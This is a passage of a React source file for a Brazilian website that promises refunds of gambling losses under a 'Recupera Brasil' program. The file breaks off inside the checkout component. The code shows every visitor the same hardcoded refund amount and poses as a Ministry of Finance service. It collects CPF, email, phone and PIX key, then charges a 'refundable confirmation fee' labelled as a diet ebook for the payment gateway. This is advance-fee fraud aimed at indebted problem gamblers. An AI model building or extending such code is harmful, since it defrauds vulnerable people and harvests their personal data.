import { createContext, useContext, useEffect, useMemo, useRef, useState, type ReactNode } from 'react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { createPayment, getConsultCpfQueryKey, getPaymentStatus, useConsultCpf } from '@workspace/api-client-react';
import QRCode from 'qrcode';
import {
  ArrowLeft,
  ArrowRight,
  BadgeCheck,
  CalendarDays,
  Check,
  CheckCircle2,
  ChevronDown,
  Clipboard,
  Copy,
  FileCheck2,
  Info,
  KeyRound,
  LockKeyhole,
  Mail,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  UserRound,
  X,
} from 'lucide-react';
import { ErrorBoundary } from '@/components/error-boundary';
import { Toaster } from '@/components/ui/toaster';
import { TooltipProvider } from '@/components/ui/tooltip';
import { Router as WouterRouter, useLocation } from 'wouter';
import { trackEvent, trackQuizCompleted, trackQuizQuestionViewed } from '@/lib/analytics';
import { trackTikTokEvent } from '@/lib/tiktok-pixel';
import { getTrackingParameters, loadTrackingPixels, trackMetaEvent } from '@/lib/tracking';
import AdminApp from '@/admin/AdminApp';

const queryClient = new QueryClient();

type Stage = 'landing' | 'intro' | 'scanning' | 'quiz' | 'analyzing' | 'result' | 'verification' | 'checkout' | 'success';
type PixType = 'cpf' | 'celular' | 'email' | 'aleatoria';

const AMOUNT_VALUE = 5433.54;
const AMOUNT = 'R$ 5.433,54';
const defaultName = 'Titular identificado';

// The confirmation fee (struck-through "original" price and the actual PIX
// amount) is configurable from the admin panel (Gateway tab). These are only
// the defaults shown before /api/offer-config responds, or if it fails.
type OfferConfig = { productName: string; originalFeeCents: number; feeCents: number };
const DEFAULT_OFFER_CONFIG: OfferConfig = { productName: 'Ebook Emagrecimento*', originalFeeCents: 6897, feeCents: 4781 };
const OfferConfigContext = createContext<OfferConfig>(DEFAULT_OFFER_CONFIG);

function formatBRL(cents: number) {
  return (cents / 100).toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
}

function OfferConfigProvider({ children }: { children: ReactNode }) {
  const [config, setConfig] = useState<OfferConfig>(DEFAULT_OFFER_CONFIG);
  useEffect(() => {
    let cancelled = false;
    fetch('/api/offer-config')
      .then((response) => (response.ok ? response.json() : null))
      .then((data: Partial<OfferConfig> & { success?: boolean } | null) => {
        if (cancelled || !data?.success) return;
        setConfig({
          productName: typeof data.productName === 'string' ? data.productName : DEFAULT_OFFER_CONFIG.productName,
          originalFeeCents: typeof data.originalFeeCents === 'number' ? data.originalFeeCents : DEFAULT_OFFER_CONFIG.originalFeeCents,
          feeCents: typeof data.feeCents === 'number' ? data.feeCents : DEFAULT_OFFER_CONFIG.feeCents,
        });
      })
      .catch(() => {});
    return () => { cancelled = true; };
  }, []);
  return <OfferConfigContext.Provider value={config}>{children}</OfferConfigContext.Provider>;
}

function useOfferConfig() {
  const config = useContext(OfferConfigContext);
  const feeValue = config.feeCents / 100;
  const discountCents = Math.max(0, config.originalFeeCents - config.feeCents);
  const discountPercent = config.originalFeeCents > 0 ? Math.round((discountCents / config.originalFeeCents) * 100) : 0;
  return {
    productName: config.productName,
    fee: formatBRL(config.feeCents),
    feeValue,
    originalFee: formatBRL(config.originalFeeCents),
    pixDiscount: formatBRL(discountCents),
    discountPercent,
    total: formatBRL(Math.round(AMOUNT_VALUE * 100) + config.feeCents),
  };
}
const ELIGIBILITY_QUESTIONS = [
  {
    text: 'Você já apostou dinheiro em alguma casa de apostas online (Bet, Esportiva, Cassino virtual)?',
    options: ['Sim, já apostei', 'Sim, aposto atualmente', 'Apostei no passado, parei', 'Nunca apostei'],
  },
  {
    text: 'Com que frequência você apostava ou aposta nas plataformas?',
    options: ['Raramente (algumas vezes por ano)', 'Ocasionalmente (1 a 3 vezes por mês)', 'Semanalmente', 'Diariamente ou quase todo dia'],
  },
  {
    text: 'Você chegou a perder um valor significativo de dinheiro em casas de apostas?',
    options: ['Sim, perdi valores consideráveis', 'Sim, mas foram valores pequenos', 'Nunca tive prejuízo', 'Prefiro não informar'],
  },
  {
    text: 'Qual é o principal motivo pelo qual você deseja solicitar o reembolso dos valores perdidos?',
    options: ['Recuperar o dinheiro para pagar dívidas', 'Usar o valor para necessidades da família', 'Recomeçar financeiramente com mais estabilidade', 'Outro motivo pessoal'],
  },
  {
    text: 'Você se considera uma pessoa que possui ou possuiu dificuldade em controlar os gastos com apostas?',
    options: ['Sim, já perdi o controle dos gastos', 'Às vezes sim, mas consigo me controlar', 'Não, sempre apostei de forma controlada', 'Nunca apostei o suficiente para saber'],
  },
  {
    text: 'Você tentou cancelar sua conta ou solicitar reembolso diretamente com a casa de apostas antes?',
    options: ['Sim, tentei e fui ignorado', 'Sim, mas meu pedido foi negado', 'Não, não sabia que era possível', 'Não, mas pretendo tentar'],
  },
  {
    text: 'Como ficou sabendo do Programa de Reembolso Recupera Brasil?',
    options: ['Pelo TikTok', 'Por indicação de amigo ou familiar', 'Por uma publicidade nas redes sociais', 'Por outro canal ou plataforma'],
  },
] as const;

function formatCpf(value: string) {
  const digits = value.replace(/\D/g, '').slice(0, 11);
  if (digits.length > 9) return digits.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
  if (digits.length > 6) return digits.replace(/(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
  if (digits.length > 3) return digits.replace(/(\d{3})(\d{1,3})/, '$1.$2');
  return digits;
}

function validEmail(value: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value.trim());
}

function validPix(type: PixType, value: string) {
  const clean = value.trim();
  if (!clean) return false;
  if (type === 'email') return validEmail(clean);
  if (type === 'cpf') return clean.replace(/\D/g, '').length === 11;
  if (type === 'celular') return clean.replace(/\D/g, '').length >= 10;
  return clean.length >= 15;
}

function getPixError(type: PixType, value: string) {
  if (!value.trim()) return 'Digite uma chave PIX para continuar.';
  if (type === 'email' && !validEmail(value)) return 'Confira o e-mail informado.';
  if (type === 'cpf' && value.replace(/\D/g, '').length !== 11) return 'O CPF deve ter 11 dígitos.';
  if (type === 'celular' && value.replace(/\D/g, '').length < 10) return 'Informe DDD e número de celular.';
  if (type === 'aleatoria' && value.trim().length < 15) return 'A chave aleatória deve ter pelo menos 15 caracteres.';
  return '';
}

function Logo({ compact = false }: { compact?: boolean }) {
  return (
    <img
      className={compact ? 'brand-logo brand-logo--compact' : 'brand-logo'}
      src="/legacy/bragoralogo/bragora.png"
      alt="Direito de Receber de Volta"
      data-testid="img-brand-logo"
    />
  );
}

function SecurityStrip() {
  return (
    <div className="security-strip" data-testid="status-secure">
      <span className="live-dot" aria-hidden="true" />
      <span>Ambiente seguro de autenticação</span>
      <span className="security-divider" />
      <LockKeyhole size={13} strokeWidth={2.5} />
      <span>Criptografia 256-bit</span>
    </div>
  );
}

function ProgressRail({ stage }: { stage: Stage }) {
  const steps = [
    { id: 'consulta', label: 'Consulta' },
    { id: 'identidade', label: 'Identidade' },
    { id: 'recebimento', label: 'Recebimento' },
  ];
  const current = stage === 'landing' || stage === 'intro' || stage === 'scanning' || stage === 'quiz' || stage === 'analyzing' ? 0 : stage === 'result' || stage === 'verification' ? 1 : 2;
  return (
    <div className="progress-rail" aria-label="Progresso da solicitação" data-testid="progress-request">
      {steps.map((step, index) => (
        <div className={`rail-step ${index <= current ? 'is-active' : ''} ${index < current ? 'is-complete' : ''}`} key={step.id}>
          <span className="rail-dot" data-testid={`status-step-${step.id}`}>
            {index < current ? <Check size={13} strokeWidth={3} /> : index + 1}
          </span>
          <span>{step.label}</span>
          {index < steps.length - 1 && <span className="rail-line" aria-hidden="true" />}
        </div>
      ))}
    </div>
  );
}

function LandingStage({ onAccess }: { onAccess: () => void }) {
  return (
    <div className="landing-stage">
      <img
        className="landing-hero"
        src="/landing-hero.webp"
        alt="Pessoa acessando a plataforma Direito de Receber de Volta pelo celular"
      />
      <div className="landing-content">
        <Logo />
        <p className="landing-highlight">
          O Programa Direito de Receber de Volta possibilita a restituição de valores perdidos em casas de apostas
        </p>
        <p className="landing-instruction">Clique no botão abaixo para acessar a plataforma</p>
        <button type="button" className="landing-button" onClick={onAccess}>
          ACESSAR AGORA
        </button>
      </div>
      <footer className="landing-footer">
        <nav aria-label="Links institucionais">
          <a href="#privacidade">Política de Privacidade</a>
          <a href="#termos">Termos de Uso</a>
        </nav>
        <p>
          INARA SUED NASCIMENTO COSTA<br />
          Q CLS 4 BLOCO A (COMERCIO), LJ 02, LOTE 02,<br />
          RIACHO FUNDO I, BRASÍLIA - DF, CEP 71820-511,<br />
          BRASIL<br />
          CNPJ: 05.475.756/0001-00
        </p>
      </footer>
    </div>
  );
}

function IntroStage({
  cpf,
  email,
  setCpf,
  setEmail,
  onSubmit,
}: {
  cpf: string;
  email: string;
  setCpf: (value: string) => void;
  setEmail: (value: string) => void;
  onSubmit: () => void;
}) {
  const cpfReady = cpf.replace(/\D/g, '').length === 11;
  const emailReady = validEmail(email);
  const formReady = cpfReady && emailReady;
  return (
    <div className="reference-intro">
      <header className="reference-header"><Logo /></header>
      <section className="reference-disclaimer" data-testid="text-legal-notice">
        Milhares de brasileiros perderam patrimônio em casas de apostas sem saber que a justiça está reconhecendo o direito à restituição. A Lei nº 14.790/2023, conhecida como a "Lei das Bets", estabeleceu regras claras para o setor e garantiu direitos aos apostadores como consumidores. Além disso, o Código de Defesa do Consumidor (Lei nº 8.078/1990) e o Código Civil (Lei nº 10.406/2002) têm sido aplicados pelos tribunais para anular contratos de apostas realizados por pessoas vulneráveis.
      </section>
      <section className="reference-form" aria-label="Dados para consulta">
        <h1 data-testid="text-page-title">Digite seu CPF e seu e-mail para consultar seus valores a ressarcir no programa Recupera Brasil</h1>
        <div className="field-group">
          <div className="input-shell">
            <input
              id="cpfInput"
              type="tel"
              inputMode="numeric"
              autoComplete="off"
              placeholder="000.000.000-00"
              value={cpf}
              onChange={(event) => setCpf(formatCpf(event.target.value))}
              data-testid="input-cpf"
            />
          </div>
        </div>
        <div className="field-group">
          <div className="input-shell">
            <input
              id="emailInput"
              type="email"
              autoComplete="email"
              placeholder="Digite aqui seu e-mail..."
              value={email}
              onChange={(event) => setEmail(event.target.value)}
              data-testid="input-email"
            />
          </div>
        </div>
        <button
          type="button"
          className="primary-button"
          onClick={() => {
            if (formReady) onSubmit();
          }}
          disabled={!formReady}
          aria-disabled={!formReady}
          data-testid="button-submit-consultation"
        >
          <span>CONSULTAR MEUS VALORES</span>
        </button>
      </section>

      <DecisionNotes />
    </div>
  );
}

function DecisionNotes() {
  return (
    <section className="decision-notes" data-testid="section-decisions">
      <p>Tribunais de todo o país têm reconhecido a nulidade de apostas e determinado a devolução de valores. Decisões recentes:</p>
      <ul>
        <li><strong>TJDFT</strong> anulou apostas e condenou a Betano Brazil a devolver um valor de R$ 18.963.232,12 a consumidores Brasileiros.</li>
        <li><strong>A Justiça de São Paulo</strong> condenou a Superbet a devolver mais de R$ 43.565.153,92 aos usuários apostadores.</li>
        <li><strong>3ª Vara Cível de Brasília</strong> declarou nulas apostas e determinou devolução de R$ 44 mil a um consumidor ludopata.</li>
        <li>Dentre outras diversas casas de apostas...</li>
      </ul>
    </section>
  );
}

const CONSULTATION_LOADING_MESSAGES = [
  'Consultando suas informações...',
  'Consultando contas onde você tem bet...',
  'Consultando valores a receber...',
  'Valores encontrados!',
] as const;

const QUIZ_LOADING_MESSAGES = [
  'Analisando suas respostas...',
  'Validando sua elegibilidade...',
  'Cruzando os dados da solicitação...',
  'Análise concluída!',
] as const;

function ScanningStage({ mode, onComplete }: { mode: 'consultation' | 'quiz'; onComplete: () => void }) {
  const messages = mode === 'consultation' ? CONSULTATION_LOADING_MESSAGES : QUIZ_LOADING_MESSAGES;
  const [messageIndex, setMessageIndex] = useState(0);

  useEffect(() => {
    const timers = messages.slice(1).map((_, index) => window.setTimeout(() => {
      setMessageIndex(index + 1);
    }, (index + 1) * 2000));
    const completionTimer = window.setTimeout(onComplete, messages.length * 2000);
    return () => {
      timers.forEach((timer) => window.clearTimeout(timer));
      window.clearTimeout(completionTimer);
    };
  }, [messages, onComplete]);

  return (
    <div className="scanning-stage" data-testid="status-scanning">
      <div className="reference-spinner" aria-hidden="true" />
      <h1 className="scanning-message" data-testid="text-scanning-message" key={messages[messageIndex]}>
        {messages[messageIndex]}
      </h1>
    </div>
  );
}

function EligibilityQuiz({ onComplete }: { onComplete: () => void }) {
  const [current, setCurrent] = useState(0);
  const [answers, setAnswers] = useState<(number | null)[]>(() => ELIGIBILITY_QUESTIONS.map(() => null));
  const question = ELIGIBILITY_QUESTIONS[current];
  const selected = answers[current];
  const progress = ((current + 1) / ELIGIBILITY_QUESTIONS.length) * 100;

  useEffect(() => {
    trackQuizQuestionViewed(current);
  }, [current]);

  const selectAnswer = (optionIndex: number) => {
    setAnswers((previous) => previous.map((answer, index) => index === current ? optionIndex : answer));
  };

  const next = () => {
    if (selected === null) return;
    if (current === ELIGIBILITY_QUESTIONS.length - 1) {
      trackEvent('eligibility_quiz_completed', { question_count: ELIGIBILITY_QUESTIONS.length });
      trackQuizCompleted(ELIGIBILITY_QUESTIONS.length);
      onComplete();
      return;
    }
    setCurrent((value) => value + 1);
  };

  return (
    <section className="eligibility-quiz" aria-labelledby="quiz-title">
      <header className="quiz-header">
        <p className="quiz-breadcrumb">Ministério da Fazenda › Serviços › Reembolso › Questionário</p>
        <Logo compact />
        <h1 id="quiz-title">Pesquisa de Elegibilidade ao Reembolso</h1>
        <p>Responda às perguntas para continuar sua solicitação.</p>
      </header>

      <div className="quiz-progress" aria-label={`Pergunta ${current + 1} de ${ELIGIBILITY_QUESTIONS.length}`}>
        <div className="quiz-progress-copy">
          <span>PERGUNTA {current + 1} DE {ELIGIBILITY_QUESTIONS.length}</span>
          <strong>{Math.round(progress)}%</strong>
        </div>
        <div className="quiz-progress-track"><span style={{ width: `${progress}%` }} /></div>
      </div>

      <fieldset className="quiz-question">
        <legend>{current + 1}. {question.text}</legend>
        <div className="quiz-options">
          {question.options.map((option, optionIndex) => (
            <label className={`quiz-option ${selected === optionIndex ? 'is-selected' : ''}`} key={option}>
              <input
                type="radio"
                name={`question-${current}`}
                checked={selected === optionIndex}
                onChange={() => selectAnswer(optionIndex)}
              />
              <span className="quiz-radio" aria-hidden="true">{selected === optionIndex && <Check size={13} strokeWidth={3} />}</span>
              <span>{option}</span>
            </label>
          ))}
        </div>
      </fieldset>

      <div className="quiz-actions">
        <button
          type="button"
          className="quiz-back"
          onClick={() => setCurrent((value) => Math.max(0, value - 1))}
          disabled={current === 0}
        >
          <ArrowLeft size={16} /> Anterior
        </button>
        <button type="button" className="quiz-next" onClick={next} disabled={selected === null}>
          {current === ELIGIBILITY_QUESTIONS.length - 1 ? 'Concluir' : 'Próxima'} <ArrowRight size={16} />
        </button>
      </div>
    </section>
  );
}

function ResultStage({ name, birthDate, consultationFailed, onContinue, onRetry }: { name: string; birthDate: string; consultationFailed: boolean; onContinue: () => void; onRetry: () => void }) {
  if (consultationFailed) {
    return (
      <>
        <header className="compact-header">
          <Logo />
          <span className="mini-status mini-status--warning"><Info size={14} /> Não foi possível confirmar</span>
        </header>
        <section className="result-intro">
          <p className="eyebrow">CONSULTA INCOMPLETA</p>
          <h1 data-testid="text-result-greeting">Não encontramos seus dados</h1>
          <p>Não conseguimos confirmar automaticamente o nome vinculado ao CPF informado. Confira se digitou corretamente e tente novamente.</p>
        </section>
        <button type="button" className="primary-button primary-button--large" onClick={onRetry} data-testid="button-retry-consultation">
          <span>Consultar novamente</span>
          <ArrowRight size={18} />
        </button>
      </>
    );
  }
  return (
    <>
      <header className="compact-header">
        <Logo />
        <span className="mini-status"><CheckCircle2 size={14} /> Consulta concluída</span>
      </header>
      <section className="result-intro">
        <p className="eyebrow">RESULTADO DA CONSULTA</p>
        <h1 data-testid="text-result-greeting">Olá, <span>{name}</span></h1>
        <p>Encontramos um valor associado aos dados consultados.</p>
      </section>
      <section className="amount-card" data-testid="status-amount-found">
        <span className="amount-label">VALOR IDENTIFICADO A RECEBER</span>
        <strong>{AMOUNT}</strong>
        <span className="amount-note"><CheckCircle2 size={15} /> Consulta vinculada ao CPF informado</span>
      </section>
      <p className="result-copy">
        Confira abaixo os dados vinculados à consulta antes de continuar.
      </p>
      <section className="result-data-card" data-testid="card-result-data">
        <div className="result-data-heading">
          <span><BadgeCheck size={19} /></span>
          <div><strong>Dados identificados</strong><small>Informações associadas ao CPF consultado</small></div>
        </div>
        <div className="result-data-row">
          <span><UserRound size={17} /> Nome completo</span>
          <strong>{name}</strong>
        </div>
        <div className="result-data-row">
          <span><CalendarDays size={17} /> Data de nascimento</span>
          <strong>{birthDate || 'Não informada'}</strong>
        </div>
        <div className="result-data-row result-data-row--amount">
          <span>Valor disponível</span>
          <strong>{AMOUNT}</strong>
        </div>
      </section>
      <p className="result-copy result-copy--last">
        Clique abaixo para indicar a chave PIX vinculada ao seu CPF e iniciar a transferência.
      </p>
      <button type="button" className="primary-button primary-button--large" onClick={onContinue} data-testid="button-start-withdrawal">
        <span>Solicitar meu saque</span>
        <ArrowRight size={18} />
      </button>
      <div className="trust-row"><ShieldCheck size={18} /><span>Dados conferidos em ambiente protegido</span></div>
    </>
  );
}

function PixKeyModal({
  name,
  cpf,
  onClose,
  onContinue,
}: {
  name: string;
  cpf: string;
  onClose: () => void;
  onContinue: (type: PixType, value: string) => void;
}) {
  const [type, setType] = useState<PixType>('cpf');
  const [value, setValue] = useState('');
  const error = getPixError(type, value);
  const canContinue = validPix(type, value);
  const placeholder: Record<PixType, string> = {
    cpf: '000.000.000-00',
    celular: '(00) 00000-0000',
    email: 'seuemail@exemplo.com',
    aleatoria: 'Cole sua chave aleatória',
  };
  return (
    <div className="modal-backdrop" role="presentation">
      <section className="pix-modal" role="dialog" aria-modal="true" aria-labelledby="pix-modal-title" data-testid="modal-pix-key">
        <button type="button" className="icon-button modal-close" onClick={onClose} aria-label="Fechar" data-testid="button-close-pix-modal">
          <X size={20} />
        </button>
        <div className="modal-brand"><Logo compact /></div>
        <div className="modal-heading">
          <span className="modal-icon"><KeyRound size={20} /></span>
          <div>
            <p className="eyebrow">DADOS DO RECEBEDOR</p>
            <h2 id="pix-modal-title">Indique sua chave PIX</h2>
          </div>
        </div>
        <div className="identity-summary">
          <div><span>Nome completo</span><strong>{name}</strong></div>
          <div><span>CPF consultado</span><strong>{cpf || 'Não informado'}</strong></div>
        </div>
        <p className="modal-copy">A transferência será enviada para o titular da chave selecionada.</p>
        <div className="field-group">
          <label htmlFor="pixKeyType">Tipo de chave PIX</label>
          <div className="select-shell">
            <select id="pixKeyType" value={type} onChange={(event) => { setType(event.target.value as PixType); setValue(''); }} data-testid="select-pix-type">
              <option value="cpf">CPF</option>
              <option value="celular">Celular</option>
              <option value="email">E-mail</option>
              <option value="aleatoria">Chave aleatória</option>
            </select>
            <ChevronDown size={17} />
          </div>
        </div>
        <div className="field-group">
          <label htmlFor="pixKeyValue">Sua chave PIX</label>
          <input
            id="pixKeyValue"
            className={`plain-input ${error && value ? 'has-error' : ''}`}
            type={type === 'email' ? 'email' : 'text'}
            inputMode={type === 'cpf' || type === 'celular' ? 'numeric' : 'text'}
            placeholder={placeholder[type]}
            value={value}
            onChange={(event) => setValue(type === 'cpf' ? formatCpf(event.target.value) : event.target.value)}
            data-testid="input-pix-key"
          />
          {error && value && <span className="inline-error">{error}</span>}
        </div>
        <button type="button" className="primary-button" onClick={() => onContinue(type, value)} disabled={!canContinue} data-testid="button-continue-pix">
          <span>Continuar para o recebimento</span>
          <ArrowRight size={18} />
        </button>
        <p className="modal-footnote"><LockKeyhole size={13} /> A chave será usada somente para esta solicitação.</p>
      </section>
    </div>
  );
}

function VerificationStage({ name, cpf, pixKey, onContinue, onBack }: { name: string; cpf: string; pixKey: string; onContinue: () => void; onBack: () => void }) {
  const { fee, total } = useOfferConfig();
  return (
    <>
      <header className="compact-header compact-header--spaced">
        <Logo />
        <span className="mini-status"><ShieldCheck size={14} /> Verificação necessária</span>
      </header>
      <section className="verification-alert">
        <span className="alert-mark">!</span>
        <div>
          <strong>Taxa de confirmação 100% reembolsável</strong>
          <p>Os {fee} serão devolvidos integralmente junto com o saque. Você não perde esse valor.</p>
        </div>
      </section>
      <p className="verification-copy">
        Por medidas de segurança, a transferência de <strong>{AMOUNT}</strong> precisa de uma
        confirmação adicional de titularidade. A taxa usada nessa validação <strong>não será descontada do seu saque</strong>.
      </p>
      <section className="data-card" data-testid="card-withdrawal-summary">
        <div className="data-row"><span>Titular da conta</span><strong>{name}</strong></div>
        <div className="data-row"><span>CPF vinculado</span><strong>{cpf || 'Não informado'}</strong></div>
        <div className="data-row"><span>Chave PIX indicada</span><strong>{pixKey}</strong></div>
      </section>
      <section className="score-notice">
        <Info size={18} />
        <p><strong>Reembolso integral garantido:</strong> após a validação, os <strong>{fee} retornam junto com o saque</strong> para a mesma conta PIX informada.</p>
      </section>
      <section className="totals-card">
        <div><span>Valor do saque</span><strong>{AMOUNT}</strong></div>
        <div><span>(+) Reembolso integral da taxa (100%)</span><strong className="green">{fee}</strong></div>
        <div className="total-row"><span>Total consolidado a receber</span><strong>{total}</strong></div>
      </section>
      <p className="reimbursement-note">
        <strong>Você receberá tudo de volta:</strong> {AMOUNT} do saque + {fee} da confirmação = <strong>{total} na sua conta PIX.</strong>
      </p>
      <button type="button" className="primary-button primary-button--large" onClick={onContinue} data-testid="button-open-checkout">
        <span>Continuar para confirmação</span>
        <ArrowRight size={18} />
      </button>
      <button type="button" className="text-button" onClick={onBack} data-testid="button-back-to-result"><ArrowLeft size={15} /> Voltar ao resultado</button>
    </>
  );
}

function RealQrCode({ value }: { value: string }) {
  const [src, setSrc] = useState<string | null>(null);
  useEffect(() => {
    let active = true;
    setSrc(null);
    QRCode.toDataURL(value, {
      width: 260,
      margin: 2,
      errorCorrectionLevel: 'M',
      color: { dark: '#122238', light: '#ffffff' },
    }).then((dataUrl) => {
      if (active) setSrc(dataUrl);
    }).catch(() => {
      if (active) setSrc(null);
    });
    return () => { active = false; };
  }, [value]);

  return (
    src
      ? <img className="real-qr-code" src={src} alt="Código QR PIX para pagamento" data-testid="img-pix-qr" />
      : <div className="real-qr-loading" role="status">Preparando código QR...</div>
  );
}

function GatewayQrCode({ value }: { value: string }) {
  return <RealQrCode value={value} />;
}

function legacyCopyToClipboard(text: string): boolean {
  if (typeof document === 'undefined') return false;
  const textarea = document.createElement('textarea');
  textarea.value = text;
  textarea.setAttribute('readonly', '');
  textarea.style.position = 'fixed';
  textarea.style.top = '0';
  textarea.style.left = '0';
  textarea.style.opacity = '0';
  textarea.style.pointerEvents = 'none';
  document.body.appendChild(textarea);
  textarea.focus();
  textarea.select();
  textarea.setSelectionRange(0, textarea.value.length);
  let succeeded = false;
  try {
    succeeded = document.execCommand('copy');
  } catch {
    succeeded = false;
  }
  document.body.removeChild(textarea);
  return succeeded;
}

async function copyTextToClipboard(text: string): Promise<boolean> {
  if (!text) return false;
  if (typeof navigator !== 'undefined' && navigator.clipboard?.writeText) {
    try {
      await navigator.clipboard.writeText(text);
      return true;
    } catch {
      // Falls through to the execCommand fallback below (common in
      // in-app browsers like Instagram/TikTok that block the async API).
    }
  }
  try {
    return legacyCopyToClipboard(text);
  } catch {
    return false;
  }
}

function CheckoutStage({
  name,
  email,
  cpf,
  pixKey,
  onClose,
  onSuccess,
  previewMode = false,
}: {
  name: string;
  email: string;
  cpf: string;
  pixKey: string;
  onClose: () => void;
  onSuccess: () => void;
  previewMode?: boolean;
}) {
  const [step, setStep] = useState<1 | 2 | 3>(previewMode ? 3 : 1);
  const [checkoutName, setCheckoutName] = useState(name);
  const [checkoutEmail, setCheckoutEmail] = useState(email);
  const [checkoutCpf, setCheckoutCpf] = useState(cpf);
  const [checkoutPhone, setCheckoutPhone] = useState('');
  const [generating, setGenerating] = useState(false);
  const [checkingPayment, setCheckingPayment] = useState(false);
  const [copied, setCopied] = useState(false);
  const [copyFailed, setCopyFailed] = useState(false);
  const pixCodeInputRef = useRef<HTMLInputElement>(null);
  const [seconds, setSeconds] = useState(29 * 60 + 59);
  const [pixCode, setPixCode] = useState(previewMode ? '00020126580014BR.GOV.BCB.PIX0136CODIGO-PIX-DE-VISUALIZACAO520400005303986540547.975802BR5925RECUPERA BRASIL6008BRASILIA62070503***6304ABCD' : '');
  const [transactionId, setTransactionId] = useState<string | null>(null);
  const [paymentError, setPaymentError] = useState('');
  const { fee, feeValue, originalFee, pixDiscount, total, discountPercent } = useOfferConfig();

  useEffect(() => {
    if (step !== 3) return;
    const timer = window.setInterval(() => setSeconds((value) => Math.max(0, value - 1)), 1000);
    return () => window.clearInterval(timer);
  }, [step]);

  const goToPayment = () => {
    if (checkoutName.trim() && validEmail(checkoutEmail) && checkoutCpf.replace(/\D/g, '').length === 11 && checkoutPhone.replace(/\D/g, '').length >= 10) {
      trackEvent('checkout_details_submitted', { payment_method: 'pix' });
      trackTikTokEvent('AddPaymentInfo', {
        content_name: 'Taxa de confirmação',
        content_type: 'product',
        value: feeValue,
        currency: 'BRL',
      });
      trackMetaEvent('AddPaymentInfo', {
        value: feeValue,
        currency: 'BRL',
      });
      setStep(2);
    }
  };
  const generatePayment = async () => {
    setGenerating(true);
    setPaymentError('');
    try {
      const payment = await createPayment({
        name: checkoutName.trim(),
        email: checkoutEmail.trim(),
        cpf: checkoutCpf.replace(/\D/g, ''),
        phone: checkoutPhone.replace(/\D/g, ''),
        pixKey,
         trackingParameters: getTrackingParameters(),
      });
      if (!payment.success || !payment.pixCode || !payment.transactionId) {
        throw new Error(payment.error || 'Não foi possível gerar o código PIX.');
      }
      setPixCode(payment.pixCode);
      setTransactionId(payment.transactionId);
      setSeconds(29 * 60 + 59);
      setStep(3);
      trackEvent('pix_payment_created', { payment_method: 'pix', amount_brl: feeValue });
      trackTikTokEvent('PlaceAnOrder', {
        content_name: 'Taxa de confirmação via PIX',
        content_type: 'product',
        value: feeValue,
        currency: 'BRL',
        contents: [{ content_id: 'taxa-confirmacao', content_name: 'Taxa de confirmação', quantity: 1, price: feeValue }],
      });
    } catch (error) {
      setPaymentError(error instanceof Error ? error.message : 'Não foi possível gerar o pagamento.');
    } finally {
      setGenerating(false);
    }
  };
  const checkPayment = async () => {
    if (!transactionId) return;
    setCheckingPayment(true);
    setPaymentError('');
    trackEvent('payment_status_checked', { payment_method: 'pix' });
    try {
      const payment = await getPaymentStatus(transactionId);
      if (payment.paid) {
        trackEvent('payment_confirmed', { payment_method: 'pix', amount_brl: feeValue });
        trackTikTokEvent('CompletePayment', {
          content_name: 'Taxa de confirmação via PIX',
          content_type: 'product',
          value: feeValue,
          currency: 'BRL',
          contents: [{ content_id: 'taxa-confirmacao', content_name: 'Taxa de confirmação', quantity: 1, price: feeValue }],
        });
        onSuccess();
        return;
      }
      setPaymentError('O pagamento ainda não foi confirmado. Aguarde alguns instantes e tente novamente.');
    } catch (error) {
      setPaymentError(error instanceof Error ? error.message : 'Não foi possível confirmar o pagamento.');
    } finally {
      setCheckingPayment(false);
    }
  };
  const copyPix = async () => {
    let success = false;
    try {
      success = await copyTextToClipboard(pixCode);
    } catch {
      success = false;
    }
    if (!success) {
      setCopied(false);
      setCopyFailed(true);
      const input = pixCodeInputRef.current;
      if (input) {
        input.focus();
        input.select();
      }
      return;
    }
    setCopyFailed(false);
    setCopied(true);
    trackEvent('pix_code_copied', { payment_method: 'pix' });
    if (transactionId) {
      void fetch(`/api/pagamento/${encodeURIComponent(transactionId)}/copied`, {
        method: 'POST',
        credentials: 'same-origin',
      }).catch(() => undefined);
    }
  };
  const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
  const remainingSeconds = String(seconds % 60).padStart(2, '0');
  return (
    <div className="checkout-layer" data-testid="modal-checkout">
      <header className="checkout-topbar">
        <button type="button" className="checkout-back" onClick={onClose} data-testid="button-close-checkout"><ArrowLeft size={18} /> <span>Voltar</span></button>
        <Logo compact />
        <div className="checkout-secure"><ShieldCheck size={19} /><span>Pagamento<br />seguro</span></div>
      </header>
      <div className="checkout-banner">Última etapa para você receber o seu valor</div>
      <main className="checkout-content">
        <section className="checkout-product">
          <div className="product-mark"><img src="/legacy/logorecuperabrasil/recuperasemfundo.png" alt="Recupera Brasil" /></div>
          <div><p>Taxa de confirmação</p><span>100% reembolsada com o saque</span></div>
          <div className="checkout-product-price"><del>{originalFee}</del><strong>{fee}</strong><small>{discountPercent}% OFF no PIX</small></div>
        </section>
        {step < 3 && (
          <div className="checkout-steps" data-testid="progress-checkout">
            {[['1', 'Seus dados'], ['2', 'Pagamento']].map(([number, label], index) => (
              <button type="button" onClick={() => index === 0 && setStep(1)} className={step === index + 1 ? 'checkout-step is-current' : step > index + 1 ? 'checkout-step is-done' : 'checkout-step'} key={number} data-testid={`button-checkout-step-${number}`}>
                <span>{step > index + 1 ? <Check size={13} /> : number}</span>{label}
              </button>
            ))}
          </div>
        )}
        {step === 1 && (
          <section className="checkout-box" data-testid="checkout-step-details">
            <div className="checkout-box-heading"><span>01</span><div><p className="eyebrow">CONFIRME SEUS DADOS</p><h2>Para onde enviaremos?</h2></div></div>
            <div className="field-group"><label htmlFor="checkoutEmail">E-mail para recebimento</label><input id="checkoutEmail" className="plain-input" type="email" value={checkoutEmail} onChange={(event) => setCheckoutEmail(event.target.value)} data-testid="input-checkout-email" /></div>
            <div className="field-group"><label htmlFor="checkoutName">Nome completo do titular</label><input id="checkoutName" className="plain-input" value={checkoutName} onChange={(event) => setCheckoutName(event.target.value)} data-testid="input-checkout-name" /></div>
            <div className="field-group"><label htmlFor="checkoutCpf">CPF do responsável</label><input id="checkoutCpf" className="plain-input" inputMode="numeric" value={checkoutCpf} onChange={(event) => setCheckoutCpf(formatCpf(event.target.value))} data-testid="input-checkout-cpf" /></div>
